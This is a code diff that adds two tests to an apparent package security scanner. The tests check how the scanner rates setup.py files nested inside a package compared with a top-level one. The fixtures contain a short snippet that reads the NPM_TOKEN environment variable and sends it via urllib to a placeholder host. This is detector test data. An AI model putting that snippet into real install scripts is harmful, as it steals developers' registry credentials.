@@ -285,6 +285,44 @@ def test_a_published_package_keeps_levels_only_for_what_installing_runs(tmp_path
     assert len(as_package.entry_points) == len(as_project.entry_points)
 
 
+def test_a_setup_py_below_the_project_root_does_not_run_from_a_package(tmp_path):
+    # Like Ansible's ansible/modules/setup.py: a module that shares the name. pip runs only
+    # the setup.py of the root it installs, and a wheel runs none below its root.
+    module = ("import os, urllib.request\n"
+              "urllib.request.urlopen('https://example.invalid', os.environ['NPM_TOKEN'])\n")
+    root = build(tmp_path, {
+        "sdist/pyproject.toml": "[build-system]\nrequires = ['setuptools']\n",
+        "sdist/PKG-INFO": "Name: demo\n",
+        "sdist/lib/demo/__init__.py": "",
+        "sdist/lib/demo/modules/__init__.py": "",
+        "sdist/lib/demo/modules/setup.py": module,
+        "wheel/demo-1.0.dist-info/WHEEL": "Wheel-Version: 1.0\n",
+        "wheel/demo/modules/setup.py": module,
+    })
+
+    def levels(report, suffix):
+        return {f.level for f in report.findings if f.path.endswith(suffix)}
+
+    as_package = scan([root], package=True)
+    assert levels(as_package, "modules/setup.py") == {Level.INFO}
+    assert {e.kind for e in as_package.entry_points} == {"setup.py below a project root"}
+    # In a repository, a setup.py in a subfolder can be a project someone installs.
+    assert Level.HIGH in levels(scan([root]), "modules/setup.py")
+
+
+def test_a_package_cannot_hide_its_own_setup_py_with_project_files(tmp_path):
+    # Project files and an __init__.py beside the real setup.py do not make it nested.
+    exfiltrate = ("import os, urllib.request\n"
+                  "urllib.request.urlopen('https://example.invalid', os.environ['NPM_TOKEN'])\n")
+    root = build(tmp_path, {
+        "setup.py": exfiltrate, "setup.cfg": "", "pyproject.toml": "", "PKG-INFO": "",
+        "__init__.py": "", "demo-1.0.dist-info/WHEEL": "",
+    })
+    report = scan([root], package=True)
+    assert Level.HIGH in {f.level for f in report.findings if f.path.endswith("setup.py")}
+    assert [e.kind for e in report.entry_points] == ["setup.py"]
+
+
 def test_setup_py_that_runs_its_own_version_file(tmp_path):
     root = build(tmp_path, {
         "setup.py": (
